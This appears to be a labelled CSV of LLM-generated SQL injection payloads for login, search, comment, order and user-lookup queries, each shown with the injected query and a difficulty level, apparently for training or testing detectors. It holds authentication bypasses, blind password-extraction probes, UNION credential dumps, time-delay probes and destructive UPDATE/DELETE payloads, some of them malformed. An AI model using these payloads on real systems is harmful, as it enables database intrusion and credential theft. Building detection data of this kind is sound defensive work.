encoding_obfuscation,comment_insert,--%3E%0D%0A1'%20UNION%20SELECT%20CHAR(65)%2BCHAR(66)%2BCHAR(67)%2BCHAR(68)%2BCHAR(69)%2BCHAR(70)%2BCHAR(71)%2BCHAR(72)%2BCHAR(73)%2BCHAR(74)%2BCHAR(75)%2BCHAR(76)%2BCHAR(77)%2BCHAR(78)%2BCHAR(79)%2BCHAR(80)%2BCHAR(81)%2BCHAR(82)%2BCHAR(83)%2BCHAR(84)%2BCHAR(85)%2BCHAR(86)%2BCHAR(87)%2BCHAR(88)%2BCHAR(89)%2BCHAR(90),"INSERT INTO comments (user_id, body) VALUES (1, '--%3E%0D%0A1'%20UNION%20SELECT%20CHAR(65)%2BCHAR(66)%2BCHAR(67)%2BCHAR(68)%2BCHAR(69)%2BCHAR(70)%2BCHAR(71)%2BCHAR(72)%2BCHAR(73)%2BCHAR(74)%2BCHAR(75)%2BCHAR(76)%2BCHAR(77)%2BCHAR(78)%2BCHAR(79)%2BCHAR(80)%2BCHAR(81)%2BCHAR(82)%2BCHAR(83)%2BCHAR(84)%2BCHAR(85)%2BCHAR(86)%2BCHAR(87)%2BCHAR(88)%2BCHAR(89)%2BCHAR(90)')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,comment_insert,<!--1';%20UPDATE%20comments%20SET%20body='%22%22--%20WHERE%20user_id=%27',"INSERT INTO comments (user_id, body) VALUES (1, '<!--1';%20UPDATE%20comments%20SET%20body='%22%22--%20WHERE%20user_id=%27'')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,comment_insert,%0D%0A1'%20OR%20EXISTS(SELECT%20*%20FROM%20information_schema.tables%20WHERE%20table_name=%22users%22%20AND%20table_schema=%22public%22),"INSERT INTO comments (user_id, body) VALUES (1, '%0D%0A1'%20OR%20EXISTS(SELECT%20*%20FROM%20information_schema.tables%20WHERE%20table_name=%22users%22%20AND%20table_schema=%22public%22)')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,comment_insert,/*1';%20CREATE%20TABLE%20test_table(a%20varchar(100));*/,"INSERT INTO comments (user_id, body) VALUES (1, '/*1';%20CREATE%20TABLE%20test_table(a%20varchar(100));*/')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
encoding_obfuscation,comment_insert,<!--1';%20DELETE%20FROM%20comments%20WHERE%20body LIKE '%--%0D%0A',"INSERT INTO comments (user_id, body) VALUES (1, '<!--1';%20DELETE%20FROM%20comments%20WHERE%20body LIKE '%--%0D%0A'')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,login,"' OR '1'='1' AND ((SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'admin') = 'a') --","SELECT * FROM users WHERE username = '' OR '1'='1' AND ((SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'admin') = 'a') --' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,login,5000  =  dbms_scheduler.get_job_state   (   (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5000  =  5000  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'admin' like '%,SELECT * FROM users WHERE username = '5000  =  dbms_scheduler.get_job_state   (   (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5000  =  5000  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'admin' like '%' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,login,-1' OR EXISTS(SELECT * FROM users WHERE username LIKE '%admin%' AND password LIKE '%admin%'),SELECT * FROM users WHERE username = '-1' OR EXISTS(SELECT * FROM users WHERE username LIKE '%admin%' AND password LIKE '%admin%')' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,login,' OR 1=(SELECT (SELECT COUNT(*)) FROM (SELECT 1) AS t) --,SELECT * FROM users WHERE username = '' OR 1=(SELECT (SELECT COUNT(*)) FROM (SELECT 1) AS t) --' AND password = 'anything',1,llm_generated,gemini-3-flash-preview,2
nested_injection,login,"admin' AND (SELECT 1 FROM (SELECT(IF(1=1,BENCHMARK(2000000,SHA1(1)),0)))x) AND '1'='1","SELECT * FROM users WHERE username = 'admin' AND (SELECT 1 FROM (SELECT(IF(1=1,BENCHMARK(2000000,SHA1(1)),0)))x) AND '1'='1' AND password = 'anything'",1,llm_generated,gemini-3-flash-preview,2
nested_injection,login,' OR (SELECT 1 FROM (SELECT (SELECT (SELECT 'a'))) AS t)='a,SELECT * FROM users WHERE username = '' OR (SELECT 1 FROM (SELECT (SELECT (SELECT 'a'))) AS t)='a' AND password = 'anything',1,llm_generated,gemini-3-flash-preview,2
nested_injection,login,' OR (SELECT CASE WHEN (1=1) THEN (SELECT '1') ELSE (SELECT '0') END)='1,SELECT * FROM users WHERE username = '' OR (SELECT CASE WHEN (1=1) THEN (SELECT '1') ELSE (SELECT '0') END)='1' AND password = 'anything',1,llm_generated,gemini-3-flash-preview,2
nested_injection,login,' OR EXISTS(SELECT 1 FROM (SELECT 1) AS t1 WHERE EXISTS(SELECT 1 FROM (SELECT 1) AS t2)) --,SELECT * FROM users WHERE username = '' OR EXISTS(SELECT 1 FROM (SELECT 1) AS t1 WHERE EXISTS(SELECT 1 FROM (SELECT 1) AS t2)) --' AND password = 'anything',1,llm_generated,gemini-3-flash-preview,2
nested_injection,login,1' AND (SELECT COUNT(*) FROM (SELECT * FROM (SELECT * FROM users LIMIT 2) AS t1 JOIN (SELECT * FROM users LIMIT 3) AS t2 UNION ALL SELECT NULL FROM users) AS t3) --,SELECT * FROM users WHERE username = '1' AND (SELECT COUNT(*) FROM (SELECT * FROM (SELECT * FROM users LIMIT 2) AS t1 JOIN (SELECT * FROM users LIMIT 3) AS t2 UNION ALL SELECT NULL FROM users) AS t3) --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,login,"(SELECT DBMS_PIPE.RECEIVE_MESSAGE('BAS', 5) FROM DUAL) AND ('%' = '%","SELECT * FROM users WHERE username = '(SELECT DBMS_PIPE.RECEIVE_MESSAGE('BAS', 5) FROM DUAL) AND ('%' = '%' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,login,"-1' UNION ALL SELECT username, password FROM users WHERE username = 'admin' --","SELECT * FROM users WHERE username = '-1' UNION ALL SELECT username, password FROM users WHERE username = 'admin' --' AND password = 'anything'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,login,' OR (SELECT (CASE WHEN (1=1) THEN 'true' ELSE 'false' END) FROM (SELECT 1)) = 'true' --,SELECT * FROM users WHERE username = '' OR (SELECT (CASE WHEN (1=1) THEN 'true' ELSE 'false' END) FROM (SELECT 1)) = 'true' --' AND password = 'anything',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,search,' AND (SELECT 1 FROM (SELECT COUNT(*) FROM users)) > 0 --,SELECT * FROM products WHERE name LIKE '%' AND (SELECT 1 FROM (SELECT COUNT(*) FROM users)) > 0 --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,search,"' UNION ALL SELECT NULL, NULL, NULL, NULL FROM users --","SELECT * FROM products WHERE name LIKE '%' UNION ALL SELECT NULL, NULL, NULL, NULL FROM users --%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,search,' OR EXISTS(SELECT 1 FROM (SELECT * FROM information_schema.tables WHERE table_name LIKE '%products%'))--,SELECT * FROM products WHERE name LIKE '%' OR EXISTS(SELECT 1 FROM (SELECT * FROM information_schema.tables WHERE table_name LIKE '%products%'))--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,search,' AND (SELECT COUNT(*) FROM (SELECT * FROM users WHERE username LIKE '%admin%')) > 0--,SELECT * FROM products WHERE name LIKE '%' AND (SELECT COUNT(*) FROM (SELECT * FROM users WHERE username LIKE '%admin%')) > 0--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,search,' OR (SELECT 1 FROM (SELECT * FROM orders WHERE order_date BETWEEN '2022-01-01' AND '2022-01-31'))--,SELECT * FROM products WHERE name LIKE '%' OR (SELECT 1 FROM (SELECT * FROM orders WHERE order_date BETWEEN '2022-01-01' AND '2022-01-31'))--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,search,' AND (SELECT COUNT(*) FROM (SELECT * FROM categories WHERE category_id = (SELECT MIN(category_id) FROM categories))) > 0--,SELECT * FROM products WHERE name LIKE '%' AND (SELECT COUNT(*) FROM (SELECT * FROM categories WHERE category_id = (SELECT MIN(category_id) FROM categories))) > 0--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,search,' OR (SELECT 1 FROM (SELECT * FROM products WHERE price < (SELECT AVG(price) FROM products)))--,SELECT * FROM products WHERE name LIKE '%' OR (SELECT 1 FROM (SELECT * FROM products WHERE price < (SELECT AVG(price) FROM products)))--%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,search,"' OR IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))=65,'a','b')--","SELECT * FROM products WHERE name LIKE '%' OR IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))=65,'a','b')--%'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,search,' OR CAST((SELECT USER()) AS CHAR),SELECT * FROM products WHERE name LIKE '%' OR CAST((SELECT USER()) AS CHAR)%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,search,' OR (SELECT count(*) FROM products WHERE id=(SELECT min(id) FROM products)) --,SELECT * FROM products WHERE name LIKE '%' OR (SELECT count(*) FROM products WHERE id=(SELECT min(id) FROM products)) --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,search,' OR (SELECT pg_sleep(5)) --,SELECT * FROM products WHERE name LIKE '%' OR (SELECT pg_sleep(5)) --%',1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,user_lookup,%' OR EXISTS(SELECT 1 FROM users WHERE username LIKE '')--,SELECT * FROM users WHERE id = %' OR EXISTS(SELECT 1 FROM users WHERE username LIKE '')--,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,user_lookup,WAITFOR DELAY '0:0:5' AND (1=1),SELECT * FROM users WHERE id = WAITFOR DELAY '0:0:5' AND (1=1),1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,user_lookup,"UNION ALL SELECT NULL,NULL,NULL FROM information_schema.tables WHERE table_name LIKE 'users'","SELECT * FROM users WHERE id = UNION ALL SELECT NULL,NULL,NULL FROM information_schema.tables WHERE table_name LIKE 'users'",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,order_filter,1' AND (SELECT COUNT(*) FROM users AS t1 JOIN transactions AS t2 ON t1.id = t2.user_id)--,SELECT * FROM orders WHERE status = '1' AND (SELECT COUNT(*) FROM users AS t1 JOIN transactions AS t2 ON t1.id = t2.user_id)--' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,order_filter,"1' OR (SELECT SUBSTRING(CAST(ASCII(SUBSTRING(password, 1, 1)) AS VARCHAR), 1, 1) LIKE '%a%'--","SELECT * FROM orders WHERE status = '1' OR (SELECT SUBSTRING(CAST(ASCII(SUBSTRING(password, 1, 1)) AS VARCHAR), 1, 1) LIKE '%a%'--' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,order_filter,1' AND LENGTH((SELECT username FROM admins WHERE id = 1)) > 0 --,SELECT * FROM orders WHERE status = '1' AND LENGTH((SELECT username FROM admins WHERE id = 1)) > 0 --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,order_filter,1' OR EXISTS(SELECT 1 FROM products WHERE price < 100) --,SELECT * FROM orders WHERE status = '1' OR EXISTS(SELECT 1 FROM products WHERE price < 100) --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,order_filter,"1' AND (SELECT DATABASE()) IN ('information_schema', 'mysql') --","SELECT * FROM orders WHERE status = '1' AND (SELECT DATABASE()) IN ('information_schema', 'mysql') --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,order_filter,"1' UNION SELECT 1, user(), password FROM users --","SELECT * FROM orders WHERE status = '1' UNION SELECT 1, user(), password FROM users --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,order_filter,"1' AND (SELECT IF(SUBSTRING(password, 1, 1)='a', 1, 0) FROM users LIMIT 1) --","SELECT * FROM orders WHERE status = '1' AND (SELECT IF(SUBSTRING(password, 1, 1)='a', 1, 0) FROM users LIMIT 1) --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,order_filter,"1' AND (SELECT ASCII(SUBSTRING(username, 1, 1)) FROM users LIMIT 1) > 0 --","SELECT * FROM orders WHERE status = '1' AND (SELECT ASCII(SUBSTRING(username, 1, 1)) FROM users LIMIT 1) > 0 --' ORDER BY date DESC",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,order_filter,1' AND (SELECT COUNT(*) FROM users WHERE status='pending') != 0 --,SELECT * FROM orders WHERE status = '1' AND (SELECT COUNT(*) FROM users WHERE status='pending') != 0 --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,order_filter,1' AND 1=1 AND (SELECT 1 FROM (SELECT 1 FROM users UNION ALL SELECT 1 FROM orders)) --,SELECT * FROM orders WHERE status = '1' AND 1=1 AND (SELECT 1 FROM (SELECT 1 FROM users UNION ALL SELECT 1 FROM orders)) --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,order_filter,1' OR EXISTS(SELECT 1 FROM (SELECT * FROM orders WHERE status LIKE '%pending%' UNION SELECT * FROM users WHERE username LIKE '%admin%'))#,SELECT * FROM orders WHERE status = '1' OR EXISTS(SELECT 1 FROM (SELECT * FROM orders WHERE status LIKE '%pending%' UNION SELECT * FROM users WHERE username LIKE '%admin%'))#' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,order_filter,1' AND (SELECT 1 FROM (SELECT * FROM orders WHERE order_id IN ((SELECT MAX(order_id) FROM orders)))) --,SELECT * FROM orders WHERE status = '1' AND (SELECT 1 FROM (SELECT * FROM orders WHERE order_id IN ((SELECT MAX(order_id) FROM orders)))) --' ORDER BY date DESC,1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,comment_insert,--' AND (SELECT COUNT(*) FROM (SELECT * FROM users WHERE username LIKE '' OR 1=1)) --,"INSERT INTO comments (user_id, body) VALUES (1, '--' AND (SELECT COUNT(*) FROM (SELECT * FROM users WHERE username LIKE '' OR 1=1)) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,comment_insert,' OR EXISTS(SELECT 1 FROM (SELECT * FROM posts WHERE content LIKE '%admin%')) --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR EXISTS(SELECT 1 FROM (SELECT * FROM posts WHERE content LIKE '%admin%')) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,comment_insert,(CASE WHEN (SELECT 1 FROM (SELECT * FROM config WHERE debug_mode = 'on')) THEN 1 ELSE 0 END) --,"INSERT INTO comments (user_id, body) VALUES (1, '(CASE WHEN (SELECT 1 FROM (SELECT * FROM config WHERE debug_mode = 'on')) THEN 1 ELSE 0 END) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,comment_insert,' OR (SELECT 1 FROM (SELECT * FROM logs WHERE error_code != ''))--,"INSERT INTO comments (user_id, body) VALUES (1, '' OR (SELECT 1 FROM (SELECT * FROM logs WHERE error_code != ''))--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,1
nested_injection,comment_insert,"--' UNION SELECT user_id, body FROM comments WHERE user_id = (SELECT user_id FROM users WHERE username LIKE '%admin%')--","INSERT INTO comments (user_id, body) VALUES (1, '--' UNION SELECT user_id, body FROM comments WHERE user_id = (SELECT user_id FROM users WHERE username LIKE '%admin%')--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,comment_insert,' OR (SELECT 1 FROM (SELECT * FROM domains WHERE domain_name LIKE '%test%' AND (SELECT COUNT(*) FROM users WHERE active = 1)))--,"INSERT INTO comments (user_id, body) VALUES (1, '' OR (SELECT 1 FROM (SELECT * FROM domains WHERE domain_name LIKE '%test%' AND (SELECT COUNT(*) FROM users WHERE active = 1)))--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,comment_insert,(CASE WHEN (SELECT 1 FROM (SELECT * FROM tables WHERE table_schema = 'public' AND column_name LIKE '%password%')) THEN 1 ELSE 0 END)--,"INSERT INTO comments (user_id, body) VALUES (1, '(CASE WHEN (SELECT 1 FROM (SELECT * FROM tables WHERE table_schema = 'public' AND column_name LIKE '%password%')) THEN 1 ELSE 0 END)--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,comment_insert,/*' OR EXISTS(SELECT 1 FROM (SELECT * FROM columns WHERE data_type = 'varchar' AND table_schema = 'private'))*/--,"INSERT INTO comments (user_id, body) VALUES (1, '/*' OR EXISTS(SELECT 1 FROM (SELECT * FROM columns WHERE data_type = 'varchar' AND table_schema = 'private'))*/--')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,comment_insert,"' AND 1=1 UNION ALL SELECT schema_name, sequence_name FROM information_schema.sequences WHERE schema_name='test' /*","INSERT INTO comments (user_id, body) VALUES (1, '' AND 1=1 UNION ALL SELECT schema_name, sequence_name FROM information_schema.sequences WHERE schema_name='test' /*')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,2
nested_injection,comment_insert,--' AND (SELECT COUNT(*) FROM (SELECT * FROM users WHERE username LIKE '' OR (SELECT 1 FROM (SELECT * FROM roles WHERE role_name LIKE '%admin%')))) --,"INSERT INTO comments (user_id, body) VALUES (1, '--' AND (SELECT COUNT(*) FROM (SELECT * FROM users WHERE username LIKE '' OR (SELECT 1 FROM (SELECT * FROM roles WHERE role_name LIKE '%admin%')))) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,comment_insert,' OR EXISTS(SELECT 1 FROM (SELECT * FROM posts WHERE content LIKE '%delete%' AND (SELECT COUNT(*) FROM permissions WHERE permission_level <= 0))) --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR EXISTS(SELECT 1 FROM (SELECT * FROM posts WHERE content LIKE '%delete%' AND (SELECT COUNT(*) FROM permissions WHERE permission_level <= 0))) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
nested_injection,comment_insert,(CASE WHEN (SELECT 1 FROM (SELECT * FROM settings WHERE theme_name LIKE '%dark%' AND (SELECT COUNT(*) FROM events WHERE event_type LIKE '%login%' AND user_agent LIKE '%Chrome%'))) THEN 1 ELSE 0 END) --,"INSERT INTO comments (user_id, body) VALUES (1, '(CASE WHEN (SELECT 1 FROM (SELECT * FROM settings WHERE theme_name LIKE '%dark%' AND (SELECT COUNT(*) FROM events WHERE event_type LIKE '%login%' AND user_agent LIKE '%Chrome%'))) THEN 1 ELSE 0 END) --')",1,llm_generated,Qwen/Qwen2.5-Coder-7B-Instruct,3
